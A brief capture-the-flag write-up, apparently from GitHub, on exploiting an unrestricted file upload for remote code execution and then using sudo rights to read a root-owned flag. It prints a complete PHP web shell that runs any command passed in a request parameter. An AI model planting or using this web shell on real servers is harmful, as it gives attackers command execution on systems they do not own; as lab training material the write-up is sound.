# n0s4n1ty 1

This is a simple arbituary file upload to rce

we have a webapage with an upload function
so i created a ```rev.php``` to upload with the content 
```php
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

```

![Screenshot from 2025-03-18 22-45-22](https://github.com/user-attachments/assets/f8ad9f60-8e01-4f3d-ab76-3b77b0d51cb9)

i uploaded the rev.php file

![Screenshot from 2025-03-18 22-44-38](https://github.com/user-attachments/assets/9bee0b27-4608-4562-8c8d-b42fb1b35aae)

The payload works

![Screenshot from 2025-03-18 22-44-38](https://github.com/user-attachments/assets/f9c4b7fc-dda6-46f9-8f2e-5658101e0ebe)

The flag is located in the ```root``` directory so running ```sudo -l``` i noticed we can run commands as root

![Screenshot from 2025-03-18 22-49-46](https://github.com/user-attachments/assets/f28b43d1-62e7-46ab-a650-421f9e87a6f5)

## Getting the flag

![Screenshot from 2025-03-18 22-52-19](https://github.com/user-attachments/assets/650fca57-fbc8-4849-b05a-c97d055d1be0)
